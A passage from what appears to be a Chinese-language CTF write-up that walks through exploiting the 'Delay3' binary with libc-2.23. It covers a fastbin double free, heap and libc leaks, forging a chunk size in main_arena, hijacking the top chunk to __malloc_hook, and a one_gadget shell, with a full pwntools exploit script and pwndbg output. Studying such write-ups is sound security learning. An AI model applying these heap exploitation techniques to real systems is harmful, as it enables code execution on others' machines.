class="line">libc_base=leak_addr<span class="number">-0x3c4b78</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+hex(libc_base))</span><br></pre></td></tr></table></figure>
<p>接下来就是利用了，我第一个想到 malloc_hook：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x7f7b59291b05</span></span><br><span class="line"><span class="number">0x7f7b59291b05</span> &lt;__memalign_hook+<span class="number">5</span>&gt;:	<span class="number">0x7b58f52a7000007f</span>	<span class="number">0x000000000000007f</span></span><br><span class="line"><span class="number">0x7f7b59291b15</span> &lt;__malloc_hook+<span class="number">5</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>又是因为“size”的限制，hook 打不了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f362e950b78</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f362e950b78</span> (main_arena+<span class="number">88</span>) —▸ <span class="number">0x561957262140</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f362e950b80</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f362e950b88</span> (main_arena+<span class="number">104</span>) —▸ <span class="number">0x561957262000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f362e950b90</span> (main_arena+<span class="number">112</span>) —▸ <span class="number">0x561957262050</span> ◂— <span class="number">0x0</span></span><br><span class="line">    </span><br><span class="line">all [corrupted]</span><br><span class="line">FD: <span class="number">0x561957262000</span> —▸ <span class="number">0x7f362e950b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x561957262000</span></span><br><span class="line">BK: <span class="number">0x561957262050</span> —▸ <span class="number">0x7f362e950b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x561957262050</span></span><br></pre></td></tr></table></figure>
<p>最后利用 Double free 通过top chunk的首位“\x55”申请到 main_arena 中，却始终劫持不了 hook，在被堆风水和段错误折磨了6个多小时后，我蚌埠住了（其实最恶心的一点是：在多线程中，GDB打印不了数据了，如果 nop 掉多线程操作，有些步骤又没法完成，吐了）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins <span class="comment">/* 一边红的GDB */</span></span><br><span class="line"><span class="string">&#x27;fastbins&#x27;</span>: Print the contents of an arena<span class="number">&#x27;</span>s fastbins, <span class="keyword">default</span> to the current thread<span class="number">&#x27;</span>s arena.</span><br><span class="line">Exception occurred: fastbins: Could <span class="keyword">not</span> convert Python object: None. (&lt;class <span class="string">&#x27;TypeError&#x27;</span>&gt;)</span><br><span class="line">For more info invoke `<span class="built_in">set</span> exception-verbose on` <span class="keyword">and</span> rerun the command</span><br><span class="line"><span class="keyword">or</span> debug it by yourself with `<span class="built_in">set</span> exception-debugger on`</span><br><span class="line"><span class="string">&#x27;unsortedbin&#x27;</span>: Print the contents of an arena<span class="number">&#x27;</span>s unsortedbin, <span class="keyword">default</span> to the current thread<span class="number">&#x27;</span>s arena.</span><br><span class="line">Exception occurred: unsortedbin: Could <span class="keyword">not</span> convert Python object: None. (&lt;class <span class="string">&#x27;TypeError&#x27;</span>&gt;)</span><br><span class="line">For more info invoke `<span class="built_in">set</span> exception-verbose on` <span class="keyword">and</span> rerun the command</span><br><span class="line"><span class="keyword">or</span> debug it by yourself with `<span class="built_in">set</span> exception-debugger on`</span><br><span class="line"><span class="string">&#x27;smallbins&#x27;</span>: Print the contents of an arena<span class="number">&#x27;</span>s smallbins, <span class="keyword">default</span> to the current thread<span class="number">&#x27;</span>s arena.</span><br><span class="line">Exception occurred: smallbins: Could <span class="keyword">not</span> convert Python object: None. (&lt;class <span class="string">&#x27;TypeError&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure>
<p>还是学习大佬的wp吧：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Log</span>(<span class="params">name</span>):</span></span><br><span class="line">    log.success(name+<span class="string">&#x27; = &#x27;</span>+<span class="built_in">hex</span>(<span class="built_in">eval</span>(name)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./Delay3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./Delay3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Num</span>(<span class="params">n, l=<span class="number">8</span></span>):</span></span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Cmd</span>(<span class="params">n, wait=<span class="literal">True</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span>(wait):</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27; :&#x27;</span>)</span><br><span class="line">    Num(n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">size, cont=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(cont)==<span class="number">0</span>):</span><br><span class="line">        cont = <span class="string">&#x27;A&#x27;</span>*(size-<span class="number">1</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    Cmd(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    Num(size)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    sh.send(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    Cmd(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    Num(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    Cmd(<span class="number">3</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    Num(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GDB</span>():</span></span><br><span class="line">    gdb.attach(sh, <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    telescope (0x202040+0x0000555555554000) 16</span></span><br><span class="line"><span class="string">    break *malloc</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#chunk arrange</span></span><br><span class="line">Add(<span class="number">0x48</span>)   <span class="comment">#A</span></span><br><span class="line">Add(<span class="number">0x48</span>)   <span class="comment">#B</span></span><br><span class="line">Add(<span class="number">0x58</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x40</span>+flat(<span class="number">0</span>, <span class="number">0x51</span>)+<span class="string">&#x27;\n&#x27;</span>)   <span class="comment">#C</span></span><br><span class="line">Add(<span class="number">0x58</span>)   <span class="comment">#D</span></span><br><span class="line">Add(<span class="number">0x58</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x30</span>+flat(<span class="number">0</span>, <span class="number">0x21</span>, <span class="number">0</span>, <span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>)   <span class="comment">#E</span></span><br><span class="line"><span class="comment">#fastbin cyclic</span></span><br><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">0</span>)   <span class="comment">#Fastbin-&gt;A&lt;-&gt;B</span></span><br><span class="line"><span class="comment">#get heap addr</span></span><br><span class="line">Show(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(sh.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x170</span></span><br><span class="line">Log(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#forge big chunk</span></span><br><span class="line">Add(<span class="number">0x48</span>, flat(heap_addr+<span class="number">0x210</span>)+<span class="string">&#x27;\n&#x27;</span>)    <span class="comment">#Fastbin-&gt;B-&gt;A-&gt;C</span></span><br><span class="line">Add(<span class="number">0x48</span>)</span><br><span class="line">Add(<span class="number">0x48</span>)</span><br><span class="line">Add(<span class="number">0x48</span>, flat(<span class="number">0</span>, <span class="number">0xA1</span>)+<span class="string">&#x27;\n&#x27;</span>)   <span class="comment">#D&#x27;s size=0xA1</span></span><br><span class="line"><span class="comment">#get UB chunk</span></span><br><span class="line">Delete(<span class="number">3</span>)   <span class="comment">#UB&lt;=&gt;(DE, 0xa0)</span></span><br><span class="line"><span class="comment">#get libc addr</span></span><br><span class="line">Show(<span class="number">3</span>)</span><br><span class="line">libc.address = u64(sh.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x3c4b78</span></span><br><span class="line">Log(<span class="string">&#x27;libc.address&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Fastbin-&gt;A&lt;-&gt;B</span></span><br><span class="line">Delete(<span class="number">0</span>)   </span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#forge size in main_arena 1</span></span><br><span class="line">Add(<span class="number">0x48</span>, flat(<span class="number">0x61</span>)+<span class="string">&#x27;\n&#x27;</span>)  <span class="comment">#Fastbin-&gt;B-&gt;A-&gt;0x61</span></span><br><span class="line"><span class="comment">#clean PtrArr, because it&#x27;s Full</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;clear done!\n&#x27;</span>)</span><br><span class="line">Num(<span class="number">666</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#forge size in main_arena 2</span></span><br><span class="line">Add(<span class="number">0x48</span>)               <span class="comment">#Fastbin-&gt;A-&gt;0x61</span></span><br><span class="line">Add(<span class="number">0x48</span>)               <span class="comment">#Fastbin-&gt;0x61</span></span><br><span class="line"><span class="comment">#Fastbin Attack</span></span><br><span class="line">Add(<span class="number">0x58</span>)   <span class="comment">#C </span></span><br><span class="line">Add(<span class="number">0x58</span>)   <span class="comment">#D</span></span><br><span class="line"><span class="comment">#Fastbin[0x60]-&gt;C&lt;-&gt;D</span></span><br><span class="line">Delete(<span class="number">2</span>)   </span><br><span class="line">Delete(<span class="number">3</span>)</span><br><span class="line">Delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fastbin alloc to main_arena</span></span><br><span class="line">Add(<span class="number">0x58</span>, flat(libc.address+<span class="number">0x3c4b38</span>)+<span class="string">&#x27;\n&#x27;</span>)    <span class="comment">#Fastbin-&gt;D-&gt;C-&gt;main_arena</span></span><br><span class="line">Add(<span class="number">0x58</span>)       <span class="comment">#Fastbin-&gt;C-&gt;main_arena</span></span><br><span class="line">Add(<span class="number">0x58</span>)       <span class="comment">#Fastbin-&gt;main_arena</span></span><br><span class="line"><span class="comment">#forege main_arena-&gt;top = __malloc_hook</span></span><br><span class="line">Add(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x30</span>+flat(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x28</span>)[<span class="number">0</span>:<span class="number">6</span>]+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#alloc to hook</span></span><br><span class="line">OGG = libc.address+<span class="number">0x4527a</span></span><br><span class="line">exp = flat(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">exp+= flat(OGG)     <span class="comment">#let __malloc_hook = realloc+6 to adjust stack</span></span><br><span class="line">exp+= flat(libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">8</span>)   <span class="comment">#let __realloc_hook = OGG</span></span><br><span class="line">Add(<span class="number">0x58</span>, exp+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line"><span class="comment">#GDB()</span></span><br><span class="line">Cmd(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">Num(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>先看 leak 过程：（leak 过程没有太大差别）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chunk arrange</span></span><br><span class="line">Add(<span class="number">0x48</span>)   <span class="comment">#A</span></span><br><span class="line">Add(<span class="number">0x48</span>)   <span class="comment">#B</span></span><br><span class="line">Add(<span class="number">0x58</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x40</span>+flat(<span class="number">0</span>, <span class="number">0x51</span>)+<span class="string">&#x27;\n&#x27;</span>)   <span class="comment">#C</span></span><br><span class="line">Add(<span class="number">0x58</span>)   <span class="comment">#D</span></span><br><span class="line">Add(<span class="number">0x58</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x30</span>+flat(<span class="number">0</span>, <span class="number">0x21</span>, <span class="number">0</span>, <span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>)   <span class="comment">#E</span></span><br><span class="line"><span class="comment">#fastbin cyclic</span></span><br><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">0</span>)   <span class="comment">#Fastbin-&gt;A&lt;-&gt;B</span></span><br><span class="line"><span class="comment">#get heap addr</span></span><br><span class="line">Show(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(sh.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x170</span></span><br><span class="line">Log(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#forge big chunk</span></span><br><span class="line">Add(<span class="number">0x48</span>, flat(heap_addr+<span class="number">0x210</span>)+<span class="string">&#x27;\n&#x27;</span>)    <span class="comment">#Fastbin-&gt;B-&gt;A-&gt;C</span></span><br><span class="line">Add(<span class="number">0x48</span>)</span><br><span class="line">Add(<span class="number">0x48</span>)</span><br><span class="line">Add(<span class="number">0x48</span>, flat(<span class="number">0</span>, <span class="number">0xA1</span>)+<span class="string">&#x27;\n&#x27;</span>)   <span class="comment">#D&#x27;s size=0xA1</span></span><br><span class="line"><span class="comment">#get UB chunk</span></span><br><span class="line">Delete(<span class="number">3</span>)   <span class="comment">#UB&lt;=&gt;(DE, 0xa0)</span></span><br><span class="line"><span class="comment">#get libc addr</span></span><br><span class="line">Show(<span class="number">3</span>)</span><br><span class="line">libc.address = u64(sh.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x3c4b78</span></span><br><span class="line">Log(<span class="string">&#x27;libc.address&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>利用 Double free 在 free chunk 的 FD 中写入“0x61”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Fastbin-&gt;A&lt;-&gt;B</span></span><br><span class="line">Delete(<span class="number">0</span>)   </span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#forge size in main_arena 1</span></span><br><span class="line">Add(<span class="number">0x48</span>, flat(<span class="number">0x61</span>)+<span class="string">&#x27;\n&#x27;</span>)  <span class="comment">#Fastbin-&gt;B-&gt;A-&gt;0x61</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="function">heap</span></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(fastbins)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x562feeed8000</span></span><br><span class="line"><span class="function">Size: 0x51</span></span><br><span class="line"><span class="function">fd: 0x61</span></span><br></pre></td></tr></table></figure>
<p>前两个chunk用于“暴露0x61”，后两个chunk继续打 Double free</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#forge size in main_arena 2</span></span><br><span class="line">Add(<span class="number">0x48</span>)               <span class="comment">#Fastbin-&gt;A-&gt;0x61</span></span><br><span class="line">Add(<span class="number">0x48</span>)               <span class="comment">#Fastbin-&gt;0x61</span></span><br><span class="line"><span class="comment">#Fastbin Attack</span></span><br><span class="line">Add(<span class="number">0x58</span>)   <span class="comment">#C </span></span><br><span class="line">Add(<span class="number">0x58</span>)   <span class="comment">#D</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Fastbin[0x60]-&gt;C&lt;-&gt;D</span></span><br><span class="line">Delete(<span class="number">2</span>)   </span><br><span class="line">Delete(<span class="number">3</span>)</span><br><span class="line">Delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x61</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x55d2842660a0</span> —▸ <span class="number">0x55d284266100</span> ◂— <span class="number">0x55d2842660a0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>刚开始我很疑惑，为什么要在 fastbin-0x50 这里写上 0x61 呢，后来想到当我自己劫持 main_arena 时的经历，fastbin 中的地址存储在 main_arena 靠前的偏移中，于是我打印了下 main_arena：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f59fc5f0b78</span><span class="number">-88</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f59fc5f0b20</span> (main_arena) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f59fc5f0b40</span> (main_arena+<span class="number">32</span>) ◂— <span class="number">0x61</span> <span class="comment">/* &#x27;a&#x27; */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f59fc5f0b48</span> (main_arena+<span class="number">40</span>) —▸ <span class="number">0x55d62de34100</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7f59fc5f0b50</span> (main_arena+<span class="number">48</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f59fc5f0b58</span> (main_arena+<span class="number">56</span>) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>发现“0x61”真的在 main_arena 中，这下可以 Double free 劫持了（刚开始我采用了 top chunk 地址的“0x55”来劫持 main_arena ，结果只能劫持 unsortedbin ，最后发生了严重的段错误）</p>
<p>Double free 劫持 top chunk：（top chunk 比 fastbin，unsortedbin 都要好劫持）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fastbin alloc to main_arena</span></span><br><span class="line">Add(<span class="number">0x58</span>, flat(libc.address+<span class="number">0x3c4b38</span>)+<span class="string">&#x27;\n&#x27;</span>)    <span class="comment">#Fastbin-&gt;D-&gt;C-&gt;main_arena</span></span><br><span class="line">Add(<span class="number">0x58</span>)       <span class="comment">#Fastbin-&gt;C-&gt;main_arena</span></span><br><span class="line">Add(<span class="number">0x58</span>)       <span class="comment">#Fastbin-&gt;main_arena</span></span><br><span class="line"><span class="comment">#forege main_arena-&gt;top = __malloc_hook</span></span><br><span class="line">Add(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x30</span>+flat(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x28</span>)[<span class="number">0</span>:<span class="number">6</span>]+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f409e371ba8</span><span class="number">-136</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f409e371b20</span> (main_arena) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f409e371b40</span> (main_arena+<span class="number">32</span>) ◂— <span class="number">0x61</span> <span class="comment">/* &#x27;a&#x27; */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f409e371b48</span> (main_arena+<span class="number">40</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x7f409e371b60</span> (main_arena+<span class="number">64</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x7f409e371b78</span> (main_arena+<span class="number">88</span>) —▸ <span class="number">0x7f409e371ae8</span> (_IO_wide_data_0+<span class="number">296</span>) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap <span class="comment">// GDB不能正常显示了,但是看&#x27;main_arena+88&#x27;的位置,应该是写上了</span></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: <span class="number">0x7f409e371000</span></span><br><span class="line">Size: <span class="number">0x7f409e7b8540</span></span><br></pre></td></tr></table></figure>
<p>成功劫持 top chunk，在我劫持 unsortedbin 的时候，末尾置空这一点始终困扰着我（末尾置空破坏了 main_arena 结构导致了段错误，后来避免段错误后，发现根本通不过检查）</p>
<p>大佬的这种写法可以少去1字节，使“\x00”不会覆盖后面的数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OGG = libc.address+<span class="number">0x4527a</span></span><br><span class="line">exp = flat(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">exp+= flat(OGG)     <span class="comment">#let __realloc_hook = one_gadget </span></span><br><span class="line">exp+= flat(libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">8</span>)   <span class="comment">#let __malloc_hook = __realloc_hook+8 </span></span><br><span class="line">Add(<span class="number">0x58</span>, exp+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
